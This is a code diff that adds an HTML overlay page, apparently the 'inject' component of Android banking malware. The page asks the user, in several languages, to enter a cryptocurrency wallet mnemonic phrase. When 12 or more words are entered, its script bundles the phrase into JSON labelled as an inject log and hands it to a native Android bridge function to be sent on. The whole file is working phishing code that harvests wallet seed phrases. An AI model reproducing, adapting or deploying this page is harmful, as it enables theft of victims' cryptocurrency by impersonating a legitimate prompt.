@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en" ng-app="app">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>    
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"></title>
+    <style>
+        body {
+            background: rgb(6,84,140);
+            background: linear-gradient(120deg, rgba(6,84,140,1) 0%, rgba(65,125,170,1) 100%);
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            text-align: center;
+            padding: 10px;
+        }
+
+        section {
+            flex: 1;
+        }
+
+        .input {
+            width: 100%;
+            height: 100%;
+            border: 0;
+            border-radius: 25px;
+            padding: 50px 30px;
+        }
+
+        .button {
+            width: 100%;
+            padding: 10px;
+            background-color: transparent;
+            border: 0;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 100;
+        }
+
+        .error {
+            color: #f00 !important;
+        }
+    </style>
+</head>
+<body ng-controller="c1">
+    <form onsubmit="return false">
+        <header>
+            <img style="float:left;width: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAiCAMAAABsgdmyAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MDVDRjBBRTdBNjU4MTFFQTk0QUJCNUIxRjk3NzRFREEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MDVDRjBBRThBNjU4MTFFQTk0QUJCNUIxRjk3NzRFREEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDowNUNGMEFFNUE2NTgxMUVBOTRBQkI1QjFGOTc3NEVEQSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDowNUNGMEFFNkE2NTgxMUVBOTRBQkI1QjFGOTc3NEVEQSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PmVViroAAABgUExURVmw4////zZ1ojZ2ojd1ojd2ojd2o1uPs2GStmGTtmWWuGaWuGuaumuau2yZunShv3Wgv3WgwHWhv3ahv3ahwHmjwXmkwXqjwXqkwXqkwoSqxoSrxoSrx4SqxoSrxoSrx23jXGUAAAAddFJOUwAAGRkdHR1daGhvb3p6eoiMjIyMjJOTk5OTpaWlJWpWlAAAALpJREFUKM9t0u0WgiAMgGEytS8rrCxiMe7/Lp3zhGzA0T/PeQ8qzuyqy9Al14Huki1cK/wC9EPBT4gY4aT44TEgTq1k6yMifju5ieXWtfKRqRXM+wbXGMG8Q+A247zdWLSJR9Z3YwTfla6s25XPrJgp88WHQL5XbEZY6k+nuPT/C67eK9Z9+njZb0cl+uxgyem8Xa8478VP23r5i5cel14PBCDNydTr8eEejsWwUf8bqqN5q01sGuTamgEKnxUNW6XsCgAAAABJRU5ErkJggg==" alt="">
+            <img style="width: 70px;margin-left: -12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPwAAABQCAMAAAAKq+jAAAAAM1BMVEX///////////////////////////////////////////////////////////////8AAADlrs5VAAAAEXRSTlMQKGgwIHBIUIAYQAhgOFh4AJwdP6IAAAQiSURBVHja7ZvbgqMgEERRQEpohf//2n3ACyBGMybjsMiTsZB4QOmiVeYqLuyoghlGItJ9jfCDhS+jqQ5eYSm2rwy+AwAQSQCQpip4AQCdcc5xC6CrCl4BGPxmbwFraoK3QDtvawBNRfD9OvDOGQC6IngBQCy/KoOveuQdAJq3OQBeE/y4AhsLoKrZXmC+8IUEoOpyeAoApOpa4D8M8wfwpq3Y28/uHgD9h4vaw/U86wholagymfE/lwf+gf9m4UREtD9nejnOF3R+52YG9rspG3fHXEP7bf0OvPYRQ7zw0aGV9h3id276aYo+OavNkWtov61i4WWmmfYT8EzoQez4OdboQfwB+ExjAtfhxVRV5TTfuVaZ2+HHvBm/Bt+thpbvNv+m2f0GPNJTZ7gMv7Jvk3ZBFv89+q/Ad/k/uQAvAIAaw7jcLOT4pPWDfTON/xX4dJVpL8PTsm43bdq7cokwpg0zXDfBJyfAcRWeBYcaC9jkopjzGSzMat8FH0c7eRmehzd6B6CPCVh4+98NH01JApfhdVglTl3HGo875h748IDxF+GHm+FtEu1YsPdjlz2LCfq/ctn7FlUSofVHJ7xwTukDW9Xj5gmPxdHO2GDvp0KdTudTH/tY+94jjM/DT4ZLR3FOuQ+YHMmF0HbjIxoAIC5EZ98b+G/Aiyjayan9i/aWh/a2/7P2dl6/8nVY0Lqr8AG9FfvGX968sJnPk4Kd/Dq8Y36Arc6Yd+HDqdR3L2kXL9+vcc59AN45J4TYG1nzQvtd+DXarZNfHWmsdf1uljhXNLzMrFBfccwDPqyGp0R4mgdxk5d5xSGmW12ujZcIP8VQvT1Ev+Lw2zTHuULh+cY79HmnEXOEnoQXCz9NWauzaOxedj7ikGlio0T4NfnY6kZwLbH7XCbiWHOW+gK8GQhA22X64ljS7CS80ktJW5LIFXKv4c1S0/wcvrFJDwarmROSHc7BByWt0dsMe2sO4JfVhnI/hg8nDrW/zjkvvQ+fo8+xJxzpvPg+vAAAO2olNwPsJZWTmlmyOMxjn4B3hpIq+pUliH+S+zG8XL4i0eljoFiyWcl0h++pnYFfHxL6XmXuDDyP58W34Zuguo4fVKSSjqUxWOm+HHqh05KvxwZFRES62e1Lnhyf+aX50UErfJSnlFGKJpJs1KUqkIzNTsx/vjDnKPQScVaWwq44LRUGT/nk/A+lwuBt9OAjIpShZE9JJcHrwHgmd28kxdNoF0gs+6JEEfB98LB9jOftVOKxNLsQKvRDBDaduxTOOUZpxF6kntL3ERZJtDsvRxUBzywAWP/dZPwqipdkTuojSZQKH/lqvm+5z0slwfvrHfN1HFc4IbWFvos/m7ReE1GX/WTyUCr2XfznresH/oF/4B/4B/6Bf+Af+Af+gX/gH/iSyz9JiY+a/dHjWgAAAABJRU5ErkJggg==" alt="">
+        </header>
+        <section>
+            <textarea name="backup" id="backup" class="input shake"></textarea>
+            <span style="position: absolute;top: 60px;z-index: 99999;display: block;text-align: center;width: 100%;font-size: 14px;font-weight: 600;">{{t.__text1}}</span>
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" value="{{t.__text2}}">
+        </footer>
+    </form>
+
+    <script>
+        var backup = document.getElementById('backup'),
+            sendData = document.getElementById('sendData');
+
+        sendData.onclick = () => {
+            if(backup.value.split(" ").length <= 11) {
+                backup.focus()
+                backup.classList.add('error')
+            } else if (backup.value.split(" ").length >= 12){
+                backup.classList.remove('error');                
+
+                var data = {};
+                    data.backup = backup.value;
+                    data.type_injects = "crypt";
+                    data.closed = "close_activity_injects";
+
+                    var ua = navigator.userAgent.toLowerCase();
+                    if(ua.indexOf("android") > -1) {
+                        try {
+                            Android.send_log_injects(JSON.stringify(data))
+                        } catch (err) {}
+                    }else{
+                        alert(JSON.stringify(data));
+                    }
+            }
+        }
+    </script>
+    <script>
+        var text, 
+            link = "facebook.com", 
+            appname = "Facebook", 
+            texts = { 
+                en: { 
+                    __text1: "Enter mnemonic phrase",
+                    __text2: "Submit",
+                }, 
+        
+                tr: { 
+                    __text1: "Anımsatıcı ifade girin",
+                    __text2: "Sunmak",
+                }, 
+                
+                es: { 
+                    __text1: "Introduzca la frase mnemotécnica",
+                    __text2: "Presentar",
+                },  
+        
+                fr: { 
+                    __text1: "Entrez une phrase mnémonique",
+                    __text2: "Soumettre",
+                }, 
+        
+                ro: { 
+                    __text1: "Introduceți fraza mnemonică",
+                    __text2: "Trimite",
+                }, 
+        
+                it: { 
+                    __text1: "Inserisci frase mnemonica",
+                    __text2: "Presentare",
+                },  
+        
+                de: { 
+                    __text1: "Mnemonische phrase eingeben",
+                    __text2: "Abgeben",
+                }, 
+            }
+
+            var language = window.navigator.userLanguage || window.navigator.language; 
+            language = language.match(/^.{2}/), texts[language] == undefined ? text = texts.en : text = texts[language]; 
+
+            var app = angular.module("app", []); 
+            app.controller("c1", ["$scope", "$rootScope", function (t, e) { 
+                rootScope = e, 
+                scope = t, 
+                e.scums = [], 
+                t.t = text, 
+                t.reset = function () { 
+                    $(e.scums).each(function () { 
+                        this.reset() }) 
+                } 
+            }]);
+        </script>
+</body>
+</html>
